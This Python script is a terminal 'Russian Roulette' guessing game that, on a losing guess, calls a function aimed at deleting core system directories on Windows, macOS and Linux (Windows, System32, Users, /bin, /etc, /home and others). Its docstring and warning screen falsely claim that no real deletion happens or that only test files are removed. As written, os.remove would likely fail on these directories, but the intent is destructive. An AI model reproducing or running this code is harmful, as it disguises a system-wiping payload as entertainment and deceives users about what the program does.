import random
import time
import os
import platform
from colorama import init, Fore, Style
import pygame
import shutil

def ensure_terminal_size(min_width=104):
    while True:
        width = shutil.get_terminal_size().columns
        if width >= min_width:
            return
        print(f"\n[!] Terminal too small! Please resize it to at least {min_width} columns, Increase Width please.")
        time.sleep(2)  # Give the user time to resize

ensure_terminal_size()

# Initialize colorama for colored text in the terminal
init()

# Initialize pygame for sound
pygame.mixer.init()

# Check if the alarm sound file exists
alarm_file = "alarm.wav"
if not os.path.exists(alarm_file):
    print(Fore.RED + f"Error: '{alarm_file}' not found. Please place an 'alarm.wav' file in the same directory." + Style.RESET_ALL)
    exit()


def remove_files():
    """
    Deletes specific files based on the operating system:
    - Windows: Deletes test11, test22, test33 from C:\
    - Linux: Deletes test1, test2, test3 from ~ (home directory)
    - macOS: Deletes test111, test222, test333 from Desktop
    """

    if os.name == "nt":  # Windows
        files_to_delete = ["C:\\Windows", "C:\\Program Files", "C:\\Program Files (x86)", "C:\\Users", "C:\\Windows\\System32", "C:\\Windows\\SysWOW64", "C:\\Users\\%username%\\AppData"]
    elif os.uname().sysname == "Darwin":  # macOS
        mchomepath = os.path.expanduser("/")
        files_to_delete = [f"{mchomepath}/bin", f"{mchomepath}/usr/bin", f"{mchomepath}/sbin", f"{mchomepath}/usr/sbin", f"{mchomepath}/System/Library", f"{mchomepath}/Library", f"{mchomepath}/Applications", f"{mchomepath}/Users"]
    else:  # Linux
        home_path = os.path.expanduser("/")
        files_to_delete = [f"{home_path}bin", f"{home_path}sbin", f"{home_path}lib", f"{home_path}boot", f"{home_path}usr/bin", f"{home_path}usr/sbin", f"{home_path}usr/lib", f"{home_path}etc", f"{home_path}var", f"{home_path}home", f"{home_path}root"
]

    for file_path in files_to_delete:
        if os.path.exists(file_path):
            try:
                os.remove(file_path)
                print(f"Deleted: {file_path}")
            except OSError as e:
                print(f"Error deleting {file_path}: {e}")
        else:
            print(f"File not found: {file_path}")


        
        

def play_alarm():
    try:
        pygame.mixer.music.load(alarm_file)
        pygame.mixer.music.play()
        while pygame.mixer.music.get_busy():
            time.sleep(0.1)  # Wait until the sound finishes playing
        print(Fore.RED + "Alarm sound played successfully!" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"Error playing sound: {e}" + Style.RESET_ALL)

def print_banner():
    banner = """
                          #####                                                                         
                         #     #  ####  #    # #####  #    # ##### ###### #####                         
                         #       #    # ##  ## #    # #    #   #   #      #    #                        
                         #       #    # # ## # #    # #    #   #   #####  #    #                        
                         #       #    # #    # #####  #    #   #   #      #####                         
                         #     # #    # #    # #      #    #   #   #      #   #                         
                          #####   ####  #    # #       ####    #   ###### #    #                        
                                                                                                        
 ######                                          ######                                                 
 #     # #    #  ####   ####  #   ##   #    #    #     #  ####  #    # #      ###### ##### ##### ###### 
 #     # #    # #      #      #  #  #  ##   #    #     # #    # #    # #      #        #     #   #      
 ######  #    #  ####   ####  # #    # # #  #    ######  #    # #    # #      #####    #     #   #####  
 #   #   #    #      #      # # ###### #  # #    #   #   #    # #    # #      #        #     #   #      
 #    #  #    # #    # #    # # #    # #   ##    #    #  #    # #    # #      #        #     #   #      
 #     #  ####   ####   ####  # #    # #    #    #     #  ####   ####  ###### ######   #     #   ###### 
    """
    print(Fore.CYAN + Style.BRIGHT + banner)

print(Fore.YELLOW + "*" * 104 + Style.RESET_ALL)

# ========== Security Warnings ==========
def show_warnings():
    print(Fore.RED + Style.BRIGHT + "!"*104)
    print("[Severe Warning]".center(104))
    print("This program is for entertainment simulation only!".center(104))
    print("It does not perform any real deletion operations.".center(104))
    print("It is forbidden to use it for any destructive purposes!".center(104))
    print("!"*104 + Style.RESET_ALL)
    time.sleep(3)

    print(Fore.YELLOW + "\n[Notice]".center(104))
    print("""This program is merely a simulation game for teaching programming concepts.
Any resemblance to real systems is purely coincidental and for educational purposes only.
The developer is not responsible for any misuse of the code.""".center(104))
    print(Style.RESET_ALL)
    time.sleep(2)

show_warnings()



print_banner()
print(Fore.YELLOW + "*" * 104 + Style.RESET_ALL)
time.sleep(0.5)

print(Fore.GREEN + "Welcome to Computer Russian Roulette! 🎮" + Style.RESET_ALL)
time.sleep(0.5)
print(Fore.GREEN + "You have 3 attempts to guess the correct number (1-6)." + Style.RESET_ALL)
print(Fore.RED + "Pick the correct number, and your PC will undergo a system wipe! 😈" + Style.RESET_ALL)
print(Fore.MAGENTA + "*" * 104 + Style.RESET_ALL)
time.sleep(0.5)

# Randomly choose the "real_wipenumber"
wipe_number = random.randint(1, 6)
used_numbers = []  # Track numbers already chosen

# List of survival messages with emojis
survival_messages = [
    "Great! You survived this time! 🎉",
    "You're amazing! Keep going! 🎉",
    "Brilliant success! Stay focused! 🎉",
    "You did it! Victory is yours! 🎉",
    "Fantastic! You made it through! 🎉",
    "Unstoppable! Keep pushing forward! 🎉",
    "Another challenge conquered! Well done! 🎉",
    "You're a survivor! Keep shining! 🎉",
    "Nothing can stop you! Keep winning! 🎉",
    "Success! You're proving your strength! 🎉",
    "Awesome! You’re on a roll! 🎉",
    "You're a champion! Keep going strong! 🎉",
    "Another win! Your journey continues! 🎉"
]

# Game loop for 3 attempts
for attempt in range(1, 4):
    print(Fore.MAGENTA + f"[Attempt {attempt}/3]" + Style.RESET_ALL)
    
    # Get player's guess with input validation
    while True:
        guess = input(Fore.CYAN + "Choose a number between 1 and 6: " + Style.RESET_ALL)
        if not guess.isdigit() or int(guess) < 1 or int(guess) > 6:
            print(Fore.RED + "Please enter a valid number between 1 and 6!" + Style.RESET_ALL)
        elif int(guess) in used_numbers:
            print(Fore.YELLOW + "You've already used this number. Choose another one!" + Style.RESET_ALL)
        else:
            used_numbers.append(int(guess))
            break
    
    guess = int(guess)
    time.sleep(0.5)  # Small delay for dramatic effect
    
    # If the guess matches the real_wipenumber, initiate wipe
    if guess == wipe_number:
        print(Fore.RED + "💀 You chose the correct number! Initiating system wipe..." + Style.RESET_ALL)
        # Optionally, play the alarm sound before wipe
        play_alarm()
        remove_files()
        break
    else:
        print(Fore.BLUE + random.choice(survival_messages) + Style.RESET_ALL)
        time.sleep(0.5)

# If the player did not trigger real_wipeduring their attempts
if guess != wipe_number:
    print(Fore.GREEN + "Congratulations! You survived all attempts and won! 🏆" + Style.RESET_ALL)

print(Fore.YELLOW + "*" * 104 + Style.RESET_ALL)
